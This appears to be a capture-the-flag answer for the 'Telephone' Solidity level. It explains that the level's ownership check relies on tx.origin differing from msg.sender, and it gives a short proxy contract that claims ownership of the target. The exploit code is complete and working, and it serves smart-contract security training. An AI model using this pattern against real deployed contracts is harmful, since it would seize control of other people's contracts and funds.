# Answer

Goal: Claim ownership of the contract.

## 1. Becoming the owner

```changeOwner()``` only line of defence is that msg.sender and tx.origin can't match. A away to work around this is to proxy the call using a contract:

```solidity
contract TelephoneExploit {

    Telephone t;

    constructor (address telephoneAddr) {
        t = Telephone(telephoneAddr);
    }

    function exploit() external {
        t.changeOwner(msg.sender);
    }
}
```